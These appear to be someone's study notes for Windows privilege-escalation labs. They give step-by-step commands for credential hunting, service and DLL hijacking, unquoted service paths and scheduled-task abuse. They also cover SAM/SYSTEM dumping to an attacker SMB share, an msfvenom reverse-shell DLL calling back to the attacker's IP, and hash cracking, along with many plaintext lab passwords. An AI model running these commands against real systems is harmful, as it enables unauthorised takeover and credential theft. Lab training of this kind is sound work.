Always obtain the following info on a system:
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes


vm 1
`nc 192.168.195.220 4444`

Gain user and group information
```
whoami
whoami /groups
```

Get other users on the system
- admins usually have a priv and non-priv acct (dave / daveadmin)
- backup users often have extensive permissions, have perms for files they don't own
- Remote Desktop users can access system with rdp, Remote Management can access with winrm
- we want to find either users that are admins, or that can use RDP
```
powershell
net user
Get-LocalUser
```

Get groups (powershell)
```
net localgroup
Get-LocalGroup
Get-LocalGroup "Remote Management Users"
Get-LocalGroupMember "Remote Management Users"
```

get OS and network information
- want interfaces, routes and active network connections
```
systeminfo
ipconfig /all
route print
netstat -ano # check all active network connections (-n (disable network resolution), -o (show process id))
```


Get running processes
- xampp can start processes

get 32 bit applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

get 64 bit applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

find which ones are currently running
```
Get-Process
```

### vm2
```
xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.195.221 /w:1200 /h:700
Get-LocalGroup "Administrators"
Get-LocalGroupMember "Administrators"
```

get executable locations associated with process ids
```
PS C:\> gwmi win32_process | select Handle, CommandLine | format-list
C:\Users\mac\AppData\Roaming\SuperCompany\NonStandardProcess.exe
```

hidden stuff VM 1
```
nc 192.168.195.220 4444
powershell
```

Find hidden files (like .git)
```
ls -Hidden
```

search for files that may have passwords etc
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\SQL2019 -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\inetpub -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\mysql\bin\my.ini
type C:\xampp\passwords.txt
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\staging\htdocs -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.conf,*.conf.bak -File -Recurse -ErrorAction SilentlyContinue

```

check groups
```
net user steve
xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.195.220 /w:1200 /h:700
```

runas allows us to run programs as a different user
```
runas /user:backupadmin cmd
runas /user:Administrator cmd
runas /user:offsec cmd
Get-ChildItem -Path C:\Users\steve\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```


VM 2
```
xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.195.221 /w:1200 /h:700
Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
username: richmond
password: GothicLifeStyle1337!
```


runas can be used with local or domain accounts as long as the user has the ability to log onto the system (GUI access)
```
runas /user:richmond cmd
```

- if the user has an active session, we can use psexec
- when you find a password, you should spray it against all users and systems as they are often reused

Powershell history VM 1 - Get powershell history
```
nc 192.168.195.220 4444
powershell
Get-History
```

Get path of saved history - use this because people clear history with Clear-History
```
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Name "Server02 Admin PW" -Secret "paperEarMonitor33@" 
type C:\Users\Public\Transcripts\transcript01.txt
```

with found password, use winRM to log in as that user (however we can't execute really any commands while in a bind shell) 
```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami
```

Get around this using evilwinRM
```
evil-winrm -i 192.168.195.220 -u daveadmin -p "qwertqwertqwert123\!\!"
xfreerdp /u:daveadmin /p:qwertqwertqwert123\!\! /v:192.168.195.220 /w:1200 /h:700
```

### VM 2
```
xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.195.221 /w:1200 /h:700
type C:\Users\mac\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

# Automated enumeration
### VM 1
- install winPEAS and use it for auto enumeration
- note that manual is more reliable as the tool may not find things
```
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
nc 192.168.195.220 4444
```

from powershell download the file we are serving up
`iwr -uri http://192.168.45.194/winPEASx64.exe -Outfile winPEAS.exe`

install seatbelt - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt
```
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/Seatbelt.exe
iwr -uri http://192.168.45.234/Seatbelt.exe.1 -Outfile seatbelt.exe
.\seatbelt.exe -group=all
```

service binary hijacking VM1
```
xfreerdp /u:daveadmin /p:qwertqwertqwert123\!\! /v:192.168.212.220 /w:1200 /h:700

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

show permissions (owner and F, RX etc)
```
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

create adduser.c on kali and cross-compile
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

transfer to windows by serving it up using python server

```
iwr -uri http://192.168.45.181/adduser.exe -Outfile adduser.exe  
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv
shutdown /r /t 0 
Get-LocalGroupMember administrators
```


lets copy powerUp to the target machine and see if it detects the same exploit
```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
iwr -uri http://192.168.45.219/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
```


can we replace an executable with a malicious one?
- display services the current user can modify
- also shows principal and if we can restart the service
- also look at Abuse Function in the output
- if you don't have perms to restart service, you have to restart the machine
```
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'
```

abuse function above does not work, check why not
```
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
```
### VM 2
```
xfreerdp /u:milena /p:MyBirthDayIsInJuly1! /v:192.168.212.220 /w:1200 /h:700
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\BackupMonitor\BackupMonitor.exe"
```

use powerup to get the name of a vulnerable file
```
iwr -uri http://192.168.45.181/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

stop service and rename
```
net stop Backupmonitor
move C:\BackupMonitor\BackupMonitor.exe BackupMonitor.exe
```

create malicious binary and replace
```
iwr -uri http://192.168.45.181/adduser.exe -Outfile adduser.exe  
move .\adduser.exe C:\BackupMonitor\BackupMonitor.exe
```

shutdown, then login again as dave, use runas to use admin user
```
shutdown /r /t 0
Get-LocalGroupMember administrators
runas /user:dave2 cmd
xfreerdp /u:dave2 /p:password123! /v:192.168.212.220 /w:1200 /h:700
```


service DLL hijacking VM 1
`xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.212.220 /w:1200 /h:700`

enumerate running processes
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

get perms for users on the file
`icacls .\Documents\BetaServ.exe`

we find that we cannot replace the exe file, so try DLL replacement (no write perms)
```
search for C:\tools\Procmon -> Procmon64 run as backupuser
$env:path
```

download file that adds an admin user from kali
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
iwr -uri http://192.168.45.181/myDLL.dll -Outfile myDLL.dll
```

check users 
```
net user
Restart-Service BetaService
```

runas does not work, but GUI does
```
xfreerdp /u:dave2 /p:password! /v:192.168.212.220 /w:1200 /h:700
```

### Unquoted service paths VM 1
```
xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.212.220 /w:1200 /h:700
```

enumerate running and stopped services
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
```

more easily find unquoted paths (cmd)
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

check that we can start and stop
```
Start-Service GammaService
Stop-Service GammaService

C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Check our rights with icacls
```
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

use our previously compiled adduser binary
```
iwr -uri http://192.168.45.181/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Start-Service GammaService
net user # created dave2 admin
```

does powerup find this vulnerability?
```
iwr -uri http://192.168.45.181/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
net user
net localgroup administrators
xfreerdp /u:dave2 /p:password123! /v:192.168.212.220 /w:1200 /h:700
```

### VM 2
```
xfreerdp /u:damian /p:ICannotThinkOfAPassword1! /v:192.168.212.221 /w:1200 /h:700
```

Find running processes with unterminated quotes using cmd
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
```

Determine where we have perms to inject a file
```
icacls "C:\"
icacls "C:\Enterprise Software"
icacls "C:\Enterprise Software\Monitoring Solution" # has write
icacls "C:\Enterprise Software\Monitoring Solution\Surveillance Apps"
```

now we can inject file
```
iwr -uri http://192.168.45.181/adduser.exe -Outfile Surveillance.exe
copy .\Surveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'
Restart-Service ReynhSurveillance 
net user
xfreerdp /u:dave2 /p:password123! /v:192.168.212.221 /w:1200 /h:700
```

### scheduled tasks VM 1
```
xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.234.220 /w:1200 /h:700
```
- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

view scheduled tasks
```
Get-ScheduledTask 
```

/fo - specify output format as list, /v - display all properties of a task
```
schtasks /query /fo LIST /v
```

check exe permissions
```
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

replace exe binary with our adduser script
```
iwr -uri http://192.168.45.181/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

task runs every minute, check that dave2 was added
```
net user
net localgroup administrators
```

use rdp to look at daveadmin's desktop
```
xfreerdp /u:dave2 /p:password123! /v:192.168.234.220 /w:1200 /h:700
```

### VM 2
```
xfreerdp /u:moss /p:work6potence6PLASMA6flint7 /v:192.168.234.221 /w:1200 /h:700
```

find tasks by certain user
```
schtasks.exe /query /V /FO CSV | convertfrom-csv | where{$_.'Run as user' -match 'roy'} | select taskname
```

found task path: `C:\Users\moss\Searches\VoiceActivation.exe`

use iwr to download our malicious exe from kali to windows
```
iwr -uri http://192.168.45.181/adduser.exe -Outfile VoiceActivation.exe
move .\Searches\VoiceActivation.exe VoiceActivation.exe.bak
move .\VoiceActivation.exe .\Searches\
xfreerdp /u:dave2 /p:password123! /v:192.168.234.221 /w:1200 /h:700
```

### Using exploits
- look for installed applications - if these run with admin rights and we can get RCE, we can elevate our privileges
- windows kernel vulnerabilities - this is much more advanced and can easily crash a system
- abuse certain privs - such as SeImpersonatePrivilege - to get privesc
- can use named pipes to impersonate clients (doesn't have to be same machine)

```
nc 192.168.234.220 4444
whoami /priv # has SeImpersonatePrivilege
```

on kali download and serve printSpoofer (to connect to a controlled named pipe)
- alternatives are potato tools
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
```

import onto target
```
powershell
iwr -uri http://192.168.45.219/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

run it passing a command with -c to use the named pipe and gain admin privileges (-i = interact in prompt)
```
.\PrintSpoofer64.exe -i -c powershell.exe
```

### VM 2
```
nc 192.168.234.222 4444
```

look for users/passwords in text files of user dir
```
Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
xfreerdp /u:alex /p:WelcomeToWinter0121 /v:192.168.234.222 /w:1200 /h:700
```

check running services for write perms
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls C:\Services\EnterpriseService.exe
```

random commands to get process info
```
Get-CimInstance -ClassName win32_service | Where-Object {$_.Name -like 'EnterpriseService'}
Get-Process -IncludeUserName | Where ProcessName -EQ 'EnterpriseService' | Select-Object -Property Name, Username
Get-Process | Where ProcessName -EQ 'EnterpriseService'
Get-Service EnterpriseService | fl *
Get-Acl EnterpriseService.exe | Select-Object Owner
```

Get a shell as the user that is running the service by exploiting the dll
```
>ms6
use exploit/multi/handler
set lhost 192.168.45.194
set lport 4444
set payload windows/x64/shell_reverse_tcp
run
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
iwr -uri http://192.168.45.181/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll
Restart-Service EnterpriseService
```

- this user has SeBackupPrivilege (whoami /priv) so we can use `ppykatz` to exploit
- note that mimikatz requires SeDebug which this user does not have
- copy sam files to temp dir so we can download them to kali
- https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
impacket-smbserver -smb2support smb smb
net use \\192.168.45.181\smb
copy \Temp\sam \\192.168.45.181\smb
copy \Temp\system \\192.168.45.181\smb
```

with the sam and system files we can extract the hashes
```
pypykatz registry --sam sam system
```

winrm doesn't seem to work. had to crack the hash and that worked
```
evil-winrm -i 192.168.234.222 -u enterpriseadmin -H "d94267c350fc02154f2aff04d384b354"
hashcat -m 1000 enterpriseadmin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
S3cureStore 

xfreerdp /u:enterpriseadmin /p:S3cureStore /v:192.168.234.222 /w:1200 /h:700
```
